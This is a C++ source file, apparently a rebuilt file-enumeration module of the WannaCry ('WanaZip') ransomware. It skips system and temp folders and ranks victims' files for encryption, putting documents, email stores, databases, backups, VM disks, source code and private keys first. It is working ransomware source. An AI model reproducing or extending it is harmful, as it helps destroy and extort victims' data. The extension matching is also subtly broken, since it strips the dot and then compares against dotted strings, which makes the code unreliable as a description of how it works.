#include "FileList.h"
#include "../Common/common.h"
#include "WanaZip.h"

FileList::FileList()
{
	m_pHead = new FileNode();
	m_pHead->m_pPrev = m_pHead->m_pNext = m_pHead;
	m_nFiles = 0;
}


FileList::~FileList()
{
	delete m_pHead;
	m_pHead = NULL;
	m_nFiles = 0;
}

BOOL FileList::Insert(PFileNode pNode)
{
	pNode->m_pNext = m_pHead;
	pNode->m_pPrev = m_pHead->m_pPrev;
	pNode->m_pPrev->m_pNext = pNode;
	m_pHead->m_pPrev = pNode;
	m_nFiles++;
	return TRUE;
}

BOOL isIgnorePath(LPCTSTR pFullPath, LPCTSTR pFileName)
{
	LPCTSTR pPath1 = _tcsnicmp(
		pFullPath,
		_T("\\\\"), 2) == 0 ?
		_tcsstr(pFullPath, _T("$\\")) :
		pFullPath + 1;
	LPCTSTR pPath2 = pPath1 + 1;
	if (pPath1) {
		if (!_tcsicmp(pPath2, _T("\\Intel")) ||
			!_tcsicmp(pPath2, _T("\\ProgramData")) ||
			!_tcsicmp(pPath2, _T("\\WINDOWS")) ||
			!_tcsicmp(pPath2, _T("\\Program Files")) ||
			!_tcsicmp(pPath2, _T("\\Program Files (x86)")) ||
			_tcsstr(pPath2, _T("\\AppData\\Local\\Temp")) ||
			_tcsstr(pPath2, _T("\\Local Settings\\Temp"))) {
			DEBUG("Skip %s\n", pFullPath);
			return TRUE;
		}
	}
	if (!_tcsicmp(pFileName, _T("This folder protects against ransomware. Modifying it will reduce protection")) ||
		!_tcsicmp(pFileName, _T("Temporary Internet Files")) ||
		!_tcsicmp(pFileName, _T("Content.IE5"))) {
		DEBUG("Skip %s\n", pFullPath);
		return TRUE;
	}
	if (!_tcsicmp(pFileName, BASE_DIRNAME)) {
		DEBUG("Skip %s\n", pFullPath);
		return TRUE;
	}
	return FALSE;
}

DWORD ClassifyFileType(LPCTSTR pFileName)
{
	static LPCTSTR HighPriorityFiles[] = { _T(".doc"),
		_T(".docx"), _T(".xls"), _T(".xlsx"), _T(".ppt"),
		_T(".pptx"), _T(".pst"), _T(".ost"), _T(".msg"),
		_T(".eml"), _T(".vsd"), _T(".vsdx"), _T(".txt"),
		_T(".csv"), _T(".rtf"), _T(".123"), _T(".wks"),
		_T(".wk1"), _T(".pdf"), _T(".dwg"), _T(".onetoc2"),
		_T(".snt"),	_T(".jpeg"), _T(".jpg"), NULL };
	static LPCTSTR LowPriorityFiles[] = { _T(".docb"),
		_T(".docm"), _T(".dot"), _T(".dotm"), _T(".dotx"),
		_T(".xlsm"), _T(".xlsb"), _T(".xlw"), _T(".xlt"),
		_T(".xlm"), _T(".xlc"), _T(".xltx"), _T(".xltm"),
		_T(".pptm"), _T(".pot"), _T(".pps"), _T(".ppsm"),
		_T(".ppsx"), _T(".ppam"), _T(".potx"), _T(".potm"),
		_T(".edb"), _T(".hwp"), _T(".602"), _T(".sxi"),
		_T(".sti"), _T(".sldx"), _T(".sldm"), _T(".sldm"),
		_T(".vdi"), _T(".vmdk"), _T(".vmx"), _T(".gpg"),
		_T(".aes"), _T(".ARC"), _T(".PAQ"), _T(".bz2"),
		_T(".tbk"), _T(".bak"), _T(".tar"), _T(".tgz"),
		_T(".gz"), _T(".7z"), _T(".rar"), _T(".zip"),
		_T(".backup"), _T(".iso"), _T(".vcd"), _T(".bmp"),
		_T(".png"), _T(".gif"), _T(".raw"), _T(".cgm"),
		_T(".tif"), _T(".tiff"), _T(".nef"), _T(".psd"),
		_T(".ai"), _T(".svg"), _T(".djvu"), _T(".m4u"),
		_T(".m3u"), _T(".mid"), _T(".wma"), _T(".flv"),
		_T(".3g2"), _T(".mkv"), _T(".3gp"), _T(".mp4"),
		_T(".mov"), _T(".avi"), _T(".asf"), _T(".mpeg"),
		_T(".vob"), _T(".mpg"), _T(".wmv"), _T(".fla"),
		_T(".swf"), _T(".wav"), _T(".mp3"), _T(".sh"),
		_T(".class"), _T(".jar"), _T(".java"), _T(".rb"),
		_T(".asp"), _T(".php"), _T(".jsp"), _T(".brd"),
		_T(".sch"), _T(".dch"), _T(".dip"), _T(".pl"),
		_T(".vb"), _T(".vbs"), _T(".ps1"), _T(".bat"),
		_T(".cmd"), _T(".js"), _T(".asm"), _T(".h"),
		_T(".pas"), _T(".cpp"), _T(".c"), _T(".cs"),
		_T(".suo"), _T(".sln"), _T(".ldf"), _T(".mdf"),
		_T(".ibd"), _T(".myi"), _T(".myd"), _T(".frm"),
		_T(".odb"), _T(".dbf"), _T(".db"), _T(".mdb"),
		_T(".accdb"), _T(".sql"), _T(".sqlitedb"),
		_T(".sqlite3"), _T(".asc"), _T(".lay6"), _T(".lay"),
		_T(".mml"), _T(".sxm"), _T(".otg"), _T(".odg"),
		_T(".uop"), _T(".std"), _T(".sxd"), _T(".otp"),
		_T(".odp"), _T(".wb2"), _T(".slk"), _T(".dif"),
		_T(".stc"), _T(".sxc"), _T(".ots"), _T(".ods"),
		_T(".3dm"), _T(".max"), _T(".3ds"), _T(".uot"),
		_T(".stw"), _T(".sxw"), _T(".ott"), _T(".odt"),
		_T(".pem"), _T(".p12"), _T(".csr"), _T(".crt"),
		_T(".key"), _T(".pfx"), _T(".der"), NULL };
	if (LPCTSTR lpSuffix = _tcsrchr(pFileName, _T('.'))) {
		lpSuffix++;
		if (!_tcsicmp(lpSuffix, _T(".exe")) ||
			!_tcsicmp(lpSuffix, _T(".dll"))) {
			return FILETYPE_EXE_DLL;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_TEMP)) {
			return FILETYPE_ZIP_TEMP;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_WRITESRC)) {
			return FILETYPE_WRITESRC;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_CIPHER)) {
			return FILETYPE_ENCRYPTED;
		}
		for (int i = 0; HighPriorityFiles[i]; i++) {
			if (!_tcsicmp(lpSuffix, HighPriorityFiles[i])) {
				return FILETYPE_HIGH_PRIORITY;
			}
		}
		for (int i = 0; LowPriorityFiles[i]; i++) {
			if (!_tcsicmp(lpSuffix, LowPriorityFiles[i])) {
				return FILETYPE_LOW_PRIORITY;
			}
		}
	}
	return FILETYPE_UNKNOWN;
}

